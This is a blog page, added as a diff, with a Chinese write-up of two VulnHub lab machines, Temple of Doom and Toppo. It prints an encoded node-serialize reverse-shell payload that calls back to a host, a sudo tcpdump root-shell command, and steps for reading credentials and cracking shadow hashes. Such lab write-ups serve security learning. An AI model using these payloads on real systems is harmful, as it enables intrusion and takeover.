@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="temple of doom介绍https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;temple-of-doom-1,243&#x2F; ip端口靶机ip:192.168.1.102 端口情况:  getshell首先去666端口看一下,发现under construction 刷新一下得到报错 1234567891011SyntaxError: Unexpected token F in JSON">
+<meta property="og:type" content="article">
+<meta property="og:title" content="靶机渗透(temple of doom,toppo)">
+<meta property="og:url" content="http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/index.html">
+<meta property="og:site_name" content="blacsheep&#39;s blog">
+<meta property="og:description" content="temple of doom介绍https:&#x2F;&#x2F;www.vulnhub.com&#x2F;entry&#x2F;temple-of-doom-1,243&#x2F; ip端口靶机ip:192.168.1.102 端口情况:  getshell首先去666端口看一下,发现under construction 刷新一下得到报错 1234567891011SyntaxError: Unexpected token F in JSON">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-14-36-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x118.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-14-46-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x33.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-14-57-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x58.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-14-59-59%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x187.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-02-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x48.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-03-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x186.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-10-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x166.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-52-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x83.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-53-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x146.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-53-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x128.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-54-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x120.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-55-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x98.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-15-59-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x181.png">
+<meta property="og:image" content="http://example.com/images/2018/10/2018-10-02-16-01-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x245.png">
+<meta property="article:published_time" content="2018-10-02T07:11:19.000Z">
+<meta property="article:modified_time" content="2023-07-10T02:13:29.452Z">
+<meta property="article:author" content="blacsheep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/2018/10/2018-10-02-14-36-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x118.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>靶机渗透(temple of doom,toppo)</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/10/03/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fminuv1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/10/01/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Fwintermute/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&text=靶机渗透(temple of doom,toppo)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&is_video=false&description=靶机渗透(temple of doom,toppo)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=靶机渗透(temple of doom,toppo)&body=Check out this article: http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&title=靶机渗透(temple of doom,toppo)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&name=靶机渗透(temple of doom,toppo)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/10/02/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8Ftemple-of-doom/&t=靶机渗透(temple of doom,toppo)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#temple-of-doom"><span class="toc-number">1.</span> <span class="toc-text">temple of doom</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.</span> <span class="toc-text">ip端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#toppo"><span class="toc-number">2.</span> <span class="toc-text">toppo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">2.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.</span> <span class="toc-text">ip和端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell-1"><span class="toc-number">2.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">2.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        靶机渗透(temple of doom,toppo)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">blacsheep</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-10-02T07:11:19.000Z" class="dt-published" itemprop="datePublished">2018-10-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/pentest/">pentest</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="temple-of-doom"><a href="#temple-of-doom" class="headerlink" title="temple of doom"></a>temple of doom</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/temple-of-doom-1,243/" title="https://www.vulnhub.com/entry/temple-of-doom-1,243/">https://www.vulnhub.com/entry/temple-of-doom-1,243/</a></p>
+<h2 id="ip端口"><a href="#ip端口" class="headerlink" title="ip端口"></a>ip端口</h2><p>靶机ip:192.168.1.102 端口情况: <a href="/images/2018/10/2018-10-02-14-36-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-14-36-53%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x118.png"></a></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>首先去666端口看一下,发现under construction 刷新一下得到报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SyntaxError: Unexpected token F in JSON at position 79</span><br><span class="line">    at JSON.parse (&lt;anonymous&gt;)</span><br><span class="line">    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)</span><br><span class="line">    at /home/nodeadmin/.web/server.js:12:29</span><br><span class="line">    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at next (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:137:13)</span><br><span class="line">    at Route.dispatch (/home/nodeadmin/.web/node_modules/express/lib/router/route.js:112:3)</span><br><span class="line">    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)</span><br><span class="line">    at /home/nodeadmin/.web/node_modules/express/lib/router/index.js:281:22</span><br><span class="line">    at Function.process_params (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:335:12)</span><br><span class="line">    at next (/home/nodeadmin/.web/node_modules/express/lib/router/index.js:275:10)</span><br></pre></td></tr></table></figure>
+
+<p>注意到重点unserialize,去搜一下nodejs的反序列化漏洞 找到文章<a target="_blank" rel="noopener" href="https://paper.seebug.org/213/" title="https://paper.seebug.org/213/">https://paper.seebug.org/213/</a> 按里面的操作生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7ZXZhbChTdHJpbmcuZnJvbUNoYXJDb2RlKDEwLDExOCw5NywxMTQsMzIsMTEwLDEwMSwxMTYsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDExMCwxMDEsMTE2LDM5LDQxLDU5LDEwLDExOCw5NywxMTQsMzIsMTE1LDExMiw5NywxMTksMTEwLDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSw5OSwxMDQsMTA1LDEwOCwxMDAsOTUsMTEyLDExNCwxMTEsOTksMTAxLDExNSwxMTUsMzksNDEsNDYsMTE1LDExMiw5NywxMTksMTEwLDU5LDEwLDcyLDc5LDgzLDg0LDYxLDM0LDQ5LDU3LDUwLDQ2LDQ5LDU0LDU2LDQ2LDQ5LDQ2LDQ5LDQ4LDUzLDM0LDU5LDEwLDgwLDc5LDgyLDg0LDYxLDM0LDU0LDU1LDQ5LDUwLDM0LDU5LDEwLDg0LDczLDc3LDY5LDc5LDg1LDg0LDYxLDM0LDUzLDQ4LDQ4LDQ4LDM0LDU5LDEwLDEwNSwxMDIsMzIsNDAsMTE2LDEyMSwxMTIsMTAxLDExMSwxMDIsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSw2MSw2MSwzMiwzOSwxMTcsMTEwLDEwMCwxMDEsMTAyLDEwNSwxMTAsMTAxLDEwMCwzOSw0MSwzMiwxMjMsMzIsODMsMTE2LDExNCwxMDUsMTEwLDEwMyw0NiwxMTIsMTE0LDExMSwxMTYsMTExLDExNiwxMjEsMTEyLDEwMSw0Niw5OSwxMTEsMTEwLDExNiw5NywxMDUsMTEwLDExNSwzMiw2MSwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTA1LDExNiw0MSwzMiwxMjMsMzIsMTE0LDEwMSwxMTYsMTE3LDExNCwxMTAsMzIsMTE2LDEwNCwxMDUsMTE1LDQ2LDEwNSwxMTAsMTAwLDEwMSwxMjAsNzksMTAyLDQwLDEwNSwxMTYsNDEsMzIsMzMsNjEsMzIsNDUsNDksNTksMzIsMTI1LDU5LDMyLDEyNSwxMCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsMzIsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiwzMiw2MSwzMiwxMTAsMTAxLDExOSwzMiwxMTAsMTAxLDExNiw0Niw4MywxMTEsOTksMTA3LDEwMSwxMTYsNDAsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0Niw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDQwLDgwLDc5LDgyLDg0LDQ0LDMyLDcyLDc5LDgzLDg0LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiwxMTUsMTA0LDMyLDYxLDMyLDExNSwxMTIsOTcsMTE5LDExMCw0MCwzOSw0Nyw5OCwxMDUsMTEwLDQ3LDExNSwxMDQsMzksNDQsOTEsOTMsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTksMTE0LDEwNSwxMTYsMTAxLDQwLDM0LDY3LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDUsMTEwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTExLDExNywxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMDEsMTE0LDExNCw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExMSwxMTAsNDAsMzksMTAxLDEyMCwxMDUsMTE2LDM5LDQ0LDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCw5OSwxMTEsMTAwLDEwMSw0NCwxMTUsMTA1LDEwMywxMTAsOTcsMTA4LDQxLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDEwMSwxMTAsMTAwLDQwLDM0LDY4LDEwNSwxMTUsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTExLDExMCw0MCwzOSwxMDEsMTE0LDExNCwxMTEsMTE0LDM5LDQ0LDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDEsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDEsMTE2LDg0LDEwNSwxMDksMTAxLDExMSwxMTcsMTE2LDQwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDQ0LDMyLDg0LDczLDc3LDY5LDc5LDg1LDg0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwxMjUsMTAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNTksMTApKQp9KCkifQ==</span><br></pre></td></tr></table></figure>
+
+<p>改cookie拿到shell <a href="/images/2018/10/2018-10-02-14-46-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-14-46-46%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x33.png"></a></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>传了探测脚本,但是并没有exp有用,卡在这里了 看了一下wp,发现提权其实有点复杂.. 首先在用户目录发现用户fireman 查看一下进程,发现fireman调用了ssmanager</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[nodeadmin@localhost home]$ ps -aux  grep fireman</span><br><span class="line">ps -aux  grep fireman</span><br><span class="line">root       797  0.0  0.4 301464  4316 ?        S    02:26   0:00 su fireman -c /usr/local/bin/ss-manager</span><br><span class="line">fireman    808  0.0  0.3  37060  3736 ?        Ss   02:26   0:00 /usr/local/bin/ss-manager</span><br><span class="line">nodeadm+  1128  0.0  0.1 213788  1040 pts/0    S+   02:50   0:00 grep --color=auto fireman</span><br></pre></td></tr></table></figure>
+
+<p>searchsploit一下,发现exp <a href="/images/2018/10/2018-10-02-14-57-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-14-57-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x58.png"></a> 看一下,发现要开8839端口,netstat一下,发现开了8839的udp <a href="/images/2018/10/2018-10-02-14-59-59%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-14-59-59%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x187.png"></a> 跑一下 <a href="/images/2018/10/2018-10-02-15-02-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-02-11%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x48.png"></a> 拿到shell <a href="/images/2018/10/2018-10-02-15-03-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-03-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x186.png"></a> sudo -l发现tcpdump可以sudo执行 利用sudo执行反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i eth0 -G 1 -w /dev/null -G 1 -W 1 -z ./1.sh -Z root</span><br></pre></td></tr></table></figure>
+
+<p>拿到shell <a href="/images/2018/10/2018-10-02-15-10-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-10-52%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x166.png"></a></p>
+<h1 id="toppo"><a href="#toppo" class="headerlink" title="toppo"></a>toppo</h1><p>这个太简单了点…</p>
+<h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/toppo-1,245/" title="https://www.vulnhub.com/entry/toppo-1,245/">https://www.vulnhub.com/entry/toppo-1,245/</a></p>
+<h2 id="ip和端口"><a href="#ip和端口" class="headerlink" title="ip和端口"></a>ip和端口</h2><p>ip:192.168.1.103 端口信息 <a href="/images/2018/10/2018-10-02-15-52-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-52-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x83.png"></a></p>
+<h2 id="getshell-1"><a href="#getshell-1" class="headerlink" title="getshell"></a>getshell</h2><p>去80端口看下 <a href="/images/2018/10/2018-10-02-15-53-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-53-10%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x146.png"></a> 简单测试一下,发现蛮多html页面,dirb一下,发现admin目录 <a href="/images/2018/10/2018-10-02-15-53-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-53-55%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x128.png"></a> 进去发现可以列目录 <a href="/images/2018/10/2018-10-02-15-54-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-54-33%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x120.png"></a> 拿到一个密码,12345ted123 尝试ssh登录,但是不知道用户名,猜一下ted <a href="/images/2018/10/2018-10-02-15-55-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-55-39%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x98.png"></a></p>
+<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>提权的方法好像还蛮多的… 查看sudoer <a href="/images/2018/10/2018-10-02-15-59-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-15-59-07%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x181.png"></a> 或者suid提权 <a href="/images/2018/10/2018-10-02-16-01-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"><img src="/images/2018/10/2018-10-02-16-01-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-300x245.png"></a> 想改root密码的话可以读一下shadow,然后john解一下 解出来密码test123 登录拿到root</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#temple-of-doom"><span class="toc-number">1.</span> <span class="toc-text">temple of doom</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.</span> <span class="toc-text">ip端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#toppo"><span class="toc-number">2.</span> <span class="toc-text">toppo</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D-1"><span class="toc-number">2.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 